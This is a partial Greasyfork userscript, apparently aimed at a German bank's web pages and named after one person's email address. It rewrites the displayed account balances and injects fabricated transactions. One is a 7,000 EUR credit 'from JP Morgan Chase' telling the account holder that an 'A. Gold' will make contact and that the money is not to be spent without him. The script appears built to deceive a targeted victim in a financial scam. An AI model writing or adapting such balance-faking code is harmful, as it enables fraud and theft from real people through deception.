// ==UserScript==
// @name         Ed 4Rec Start DB ed.belle@t-online.de
...
// @downloadURL https://update.greasyfork.org/scripts/499585/Ed%204Rec%20Start%20DB%20edbelle%40t-onlinede.user.js
// @updateURL https://update.greasyfork.org/scripts/499585/Ed%204Rec%20Start%20DB%20edbelle%40t-onlinede.meta.js
// ==/UserScript==
//======================================================================================================================================================================================
//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
//======================================================================================================================================================================================
...
//         UBERSICHT
    ...
    const accountBalanceAdjustments = [
        ...
        { index: 1, amount: 0 },
         ...
         { index: 2, amount: 476},  //3   // will have to change to 1395
     //   { index: 3, amount: 6700 },  // 4  //will have to change to app 5700
   //     { index: 4, amount: 7000},  // 5
   //      { index: 5, amount: 7000}, //1
   //      { index: 6, amount:  0},
  //      { index: 7, amount: 7000}, //2
         { index: 8, amount:  0},
        { index: 9, amount: 0 },
...
// UMSATZE TRANSACTIONS
   ...
   // Array of transaction details objects
    var transactions = [
        ...
        {
            date: '19.08.2024',
            bookingDate: '19.08.2024',
            purpose: 'Gutschrift von JP Morgan Chase. A. Gold meldet sich. Ohne ihn bitte nicht ausgeben.',
            debit: '',
           credit: '7.000,00',
           currency: 'EUR'
       },
